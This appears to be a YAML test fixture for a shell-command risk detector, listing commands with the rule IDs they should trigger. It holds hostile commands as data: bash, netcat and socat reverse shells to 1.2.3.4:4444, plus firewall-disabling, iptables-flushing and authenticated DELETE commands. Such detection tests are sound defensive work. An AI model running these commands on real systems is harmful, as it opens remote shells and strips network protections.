# ====== EDGE CASE / STRESS TESTS ======

# -- network:bring_down_interface_ip edge cases --
- test: "ip link set br-abc123 down"
  description: "match hyphenated interface name"
  expect_ids: ["network:bring_down_interface_ip"]
- test: "ip link set docker0 down"
  description: "EDGE: docker bridge interface"
  expect_ids: ["network:bring_down_interface_ip"]

# -- network:disable_firewall edge cases --
- test: "ufw disabled"
  description: "negative: 'ufw disabled' should not match - requires word boundary after disable"
  expect_ids: []

# -- network:flush_iptables edge cases --
- test: "ip6tables -F"
  description: "match ip6tables flush rules"
  expect_ids: ["network:flush_iptables"]
# -- network:iptables_default_drop --
- test: 'iptables -P INPUT DROP'
  description: "default DROP on INPUT"
  expect_ids: ["network:iptables_default_drop"]
- test: 'ip6tables --policy OUTPUT DROP'
  description: "ip6tables default DROP"
  expect_ids: ["network:iptables_default_drop"]
- test: 'iptables -P INPUT ACCEPT'
  description: "negative: ACCEPT policy"
  expect_ids: []
# -- option order --
- test: "iptables --flush"
  description: "long --flush"
  expect_ids: ["network:flush_iptables"]
- test: "iptables -w -F"
  description: "-F after another option"
  expect_ids: ["network:flush_iptables"]
- test: "iptables -t filter -F"
  description: "the filter table"
  expect_ids: ["network:flush_iptables"]
- test: "iptables -t nat --flush"
  description: "the nat table is flush_nat_rules"
  expect_ids: ["network:flush_nat_rules"]
- test: "iptables -w --delete-chain"
  description: "long --delete-chain"
  expect_ids: ["network:delete_custom_chains"]
- test: "ufw reset"
  description: "ufw reset without --force"
  expect_ids: ["network:force_reset_firewall"]
- test: "iptables -L -n"
  description: "listing rules is fine"
  expect_ids: []
- test: "sudo ip addr flush dev eth0"
  description: "removing the interface addresses"
  expect_ids: ["network:flush_addresses"]
- test: "ip addr show"
  description: "negative: listing addresses"
  expect_ids: []
- test: "sudo ufw default deny incoming"
  description: "deny incoming by default"
  expect_ids: ["network:ufw_default_deny"]
- test: "sudo ufw allow OpenSSH"
  description: "negative: allowing ssh"
  expect_ids: []
- test: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
  description: "a bash reverse shell"
  expect_ids: ["network:reverse_shell"]
- test: "nc -e /bin/sh 1.2.3.4 4444"
  description: "netcat with -e"
  expect_ids: ["network:reverse_shell"]
- test: "socat tcp:1.2.3.4:4444 exec:/bin/sh"
  description: "socat exec"
  expect_ids: ["network:reverse_shell"]
- test: "timeout 1 bash -c '</dev/tcp/db/5432'"
  description: "negative: a /dev/tcp port probe"
  expect_ids: []
- test: "nc -zv db 5432"
  description: "negative: a port scan of one port"
  expect_ids: []
# -- Windows firewall off --
- test: "netsh advfirewall set allprofiles state off"
  description: "turn the Windows firewall off (all profiles)"
  expect_ids: ["network:disable_firewall_windows"]
- test: "netsh advfirewall set currentprofile state off"
  description: "turn the current-profile firewall off"
  expect_ids: ["network:disable_firewall_windows"]
- test: "netsh firewall set opmode disable"
  description: "legacy netsh firewall off"
  expect_ids: ["network:disable_firewall_windows"]
- test: "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
  description: "Set-NetFirewallProfile disabled"
  expect_ids: ["network:disable_firewall_windows"]
- test: "netsh advfirewall show allprofiles"
  description: "negative: showing firewall profiles"
  expect_ids: []
# -- a catch-all DROP appended to INPUT (SSH lockout) --
- test: "iptables -A INPUT -j DROP"
  description: "blanket DROP appended to INPUT"
  expect_ids: ["network:iptables_drop_all_input"]
- test: "iptables -I INPUT -j REJECT"
  description: "blanket REJECT inserted on INPUT"
  expect_ids: ["network:iptables_drop_all_input"]
- test: "iptables -A INPUT -s 10.0.0.5 -j DROP"
  description: "negative: a host-specific DROP is not a blanket lockout"
  expect_ids: []

# -- network:http_delete_authenticated --
- test: "xh --bearer $API_TOKEN DELETE https://api.example.com/items/1"
  description: "xh DELETE with --bearer"
  expect_ids: ["network:http_delete_authenticated"]
- test: "http --bearer $API_TOKEN GET https://api.example.com/items/1"
  description: "negative: a GET with --bearer"
  expect_ids: []
- test: "xh --bearer tok DELETE :8080/items/1"
  description: "negative: a local development server"
  expect_ids: []
- test: "curl -X DELETE https://api.vercel.com/v9/projects/web -H \"Authorization: Bearer $VERCEL_TOKEN\""
  description: "DELETE with a bearer token"
  expect_ids: ["network:http_delete_authenticated"]
- test: "curl -X DELETE -H \"Authorization: token $T\" https://api.github.com/repos/acme/web"
  description: "header before the URL"
  expect_ids: ["network:http_delete_authenticated"]
- test: "curl --request DELETE https://api.cloudflare.com/client/v4/zones/z/dns_records/r -H \"X-Auth-Key: $K\""
  description: "--request with an API key header"
  expect_ids: ["network:http_delete_authenticated"]
- test: "curl -sSX DELETE https://api.example.com/v1/items/1 -u admin:$PW"
  description: "basic auth and a flag cluster"
  expect_ids: ["network:http_delete_authenticated"]
- test: "http DELETE https://api.example.com/items/1 \"Authorization:Bearer $T\""
  description: "httpie with an auth header item"
  expect_ids: ["network:http_delete_authenticated"]
- test: "xh delete https://api.example.com/items/1 -a user:pw"
  description: "xh with -a"
  expect_ids: ["network:http_delete_authenticated"]
- test: "wget --method=DELETE --header=\"Authorization: Bearer $T\" https://api.example.com/items/1"
  description: "wget with an auth header"
  expect_ids: ["network:http_delete_authenticated"]

